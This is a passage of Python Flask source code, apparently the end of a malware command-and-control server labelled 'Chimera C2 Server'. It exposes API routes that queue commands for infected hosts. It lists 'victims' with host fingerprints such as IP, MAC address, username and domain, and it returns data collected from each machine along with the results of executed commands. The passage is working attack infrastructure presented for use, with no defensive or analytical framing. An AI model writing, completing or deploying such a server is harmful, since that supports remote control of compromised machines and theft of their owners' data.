        logging.info(f"Command queued: {cmd_text[:50]}")
        return jsonify({'status': 'queued', 'command_id': cmd.id})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/victims', methods=['GET'])
def get_victims():
    try:
        victims = Victim.query.order_by(Victim.last_seen.desc()).all()
        return jsonify({'victims': [
            {
                'id': v.victim_id,
                'hostname': v.hostname,
                'ip': v.ip,
                'mac': v.mac,
                'os': v.os,
                'os_version': v.os_version,
                'architecture': v.architecture,
                'cpu': v.cpu,
                'memory': v.memory,
                'disk': v.disk,
                'username': v.username,
                'domain': v.domain,
                'first_seen': v.first_seen.isoformat() if v.first_seen else None,
                'last_seen': v.last_seen.isoformat() if v.last_seen else None,
                'status': v.status
            } for v in victims
        ]})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/victim/<victim_id>', methods=['GET'])
def get_victim(victim_id):
    try:
        v = Victim.query.filter_by(victim_id=victim_id).first()
        if not v:
            return jsonify({'error': 'Victim not found'}), 404
        
        data_entries = CollectedData.query.filter_by(victim_id=victim_id).order_by(
            CollectedData.timestamp.desc()).limit(50).all()
        cmds = Command.query.filter_by(victim_id=victim_id).order_by(
            Command.issued_at.desc()).limit(20).all()
        
        return jsonify({
            'victim': {
                'id': v.victim_id,
                'hostname': v.hostname,
                'ip': v.ip,
                'mac': v.mac,
                'os': v.os,
                'status': v.status
            },
            'data': [
                {
                    'id': d.id,
                    'type': d.data_type,
                    'content': json.loads(d.content) if d.content else {},
                    'timestamp': d.timestamp.isoformat() if d.timestamp else None
                } for d in data_entries
            ],
            'commands': [
                {
                    'id': c.id,
                    'command': c.command,
                    'status': c.status,
                    'result': c.result,
                    'issued_at': c.issued_at.isoformat() if c.issued_at else None,
                    'executed_at': c.executed_at.isoformat() if c.executed_at else None
                } for c in cmds
            ]
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    try:
        return jsonify({
            'total_victims': Victim.query.count(),
            'active_victims': Victim.query.filter_by(status='active').count(),
            'pending_commands': Command.query.filter_by(status='pending').count(),
            'total_data': CollectedData.query.count()
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    logging.info("=" * 60)
    logging.info("Chimera C2 Server - Enhanced Dashboard")
    logging.info("=" * 60)
    app.run(host='0.0.0.0', port=8080, debug=False)

